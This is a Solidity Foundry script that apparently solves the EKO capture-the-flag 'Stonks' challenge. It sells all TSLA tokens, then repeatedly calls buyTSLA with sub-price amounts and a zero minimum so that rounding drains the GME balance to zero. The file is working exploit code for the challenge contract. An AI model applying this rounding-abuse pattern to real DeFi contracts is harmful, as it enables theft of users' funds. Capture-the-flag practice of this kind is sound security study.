// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity 0.8.17;

import { Math } from "openzeppelin-contracts/utils/math/Math.sol";
import { Script } from "forge-std/Script.sol";
import { Stonks } from "eko/ChallengeStonks.sol";

contract StonksCrackerScript is Script {
  function run() external {
    Stonks stonks = Stonks(vm.envAddress("STONKS_ADDRESS"));
    address wallet = vm.envAddress("WALLET_ADDRESS");
    uint256 price = stonks.ORACLE_TSLA_GME();
    uint256 tsla = stonks.TSLA();
    uint256 gme = stonks.GME();
    uint256 balance = stonks.balanceOf(wallet, tsla);

    vm.broadcast(wallet);
    stonks.sellTSLA(balance, balance * price);

    while ((balance = stonks.balanceOf(wallet, gme)) > 0) {
      vm.broadcast(wallet);
      stonks.buyTSLA(Math.min(price - 1, balance), 0);
    }

    assert(stonks.balanceOf(wallet, tsla) == 0 && stonks.balanceOf(wallet, gme) == 0);
  }
}
